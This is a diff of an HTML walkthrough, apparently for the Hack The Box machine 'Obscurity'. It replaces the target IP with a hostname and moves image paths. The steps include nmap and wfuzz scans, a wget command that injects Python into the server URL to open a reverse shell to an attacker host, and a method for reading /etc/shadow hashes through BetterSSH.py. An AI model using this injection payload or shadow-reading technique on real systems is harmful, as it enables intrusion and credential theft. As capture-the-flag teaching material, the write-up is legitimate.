@@ -25,7 +25,7 @@
             <div class="code-block">
                 <div class="code-line">
                     <span class="prompt">root@kali:/#</span>
-                    <code>nmap -p- -T5 -A 10.10.10.168</code>
+                    <code>nmap -p- -T5 -A obscurity.htb</code>
                 </div>
                 <br>
                 <div class="code-line">
@@ -40,9 +40,9 @@
         <div class="step">
             <p>2. There is some content on the website which has some useful information:</p>
             <div>
-                <img  class="step_img_sm"  style="display: block;" src="./obscurity_img0_1.png"/><br>
-                <img  class="step_img_sm"  style="display: block;" src="./obscurity_img0_2.png"/><br>
-                <img  class="step_img_sm"  style="display: block;" src="./obscurity_img0_3.png"/>
+                <img  class="step_img_sm"  style="display: block;" src="./imgs/obscurity/img1.png"/><br>
+                <img  class="step_img_sm"  style="display: block;" src="./imgs/obscurity/img2.png"/><br>
+                <img  class="step_img_sm"  style="display: block;" src="./imgs/obscurity/img3.png"/>
             </div>
         </div>
 
@@ -51,15 +51,15 @@
             <div class="code-block">
                 <div class="code-line">
                     <span class="prompt">root@kali:/#</span>
-                    <code>wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code>
+                    <code>wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py</code>
                 </div>
             </div>
         </div>
 
         <div class="step">
-            <p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://10.10.10.168:8080/develop/SuperSecureServer.py" target="_blank">http://10.10.10.168:8080/develop/SuperSecureServer.py</a>.<br>
+            <p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py" target="_blank">http://obscurity.htb:8080/develop/SuperSecureServer.py</a>.<br>
                 While analysing it, we find something interesting:</p>
-            <img src="./obscurity_img1.png"/>
+            <img src="./imgs/obscurity/img4.png"/>
         </div>
 
         <div class="step">
@@ -67,7 +67,7 @@
             <div class="code-block">
                 <div class="code-line">
                     <span class="prompt">root@kali:/#</span>
-                    <code>wget http://10.10.10.168:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'</code>
+                    <code>wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'</code>
                 </div>
             </div>
         </div>
@@ -150,12 +150,12 @@
                 Also, when use we this key to encrypt robert's password we get the content of passwordreminder.txt.<br>
                 Let's create a script to find the key!
             </p>
-            <img src="./script1.png">
+            <img src="./imgs/obscurity/script1.png">
         </div>
 
         <div class="step">
             <p>9. Now that we have the key, let's use it to find robert's password!</p>
-            <img src="./script2.png">
+            <img src="./imgs/obscurity/script2.png">
         </div>
     
 
@@ -203,12 +203,12 @@
 
         <div class="step">
             <p>12. After looking at BetterSSH.py we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on  /tmp/SSH/.</p>
-            <img src="script3.png"/>
+            <img src="./imgs/obscurity/script3.png"/>
         </div>
         
         <div class="step">
             <p>13. So we create a script to print them to a file we can read after the process is finished (/tmp/o.txt):</p>
-            <img src="script4.png"/>
+            <img src="./imgs/obscurity/script4.png"/>
         </div>
 
         <div class="step">
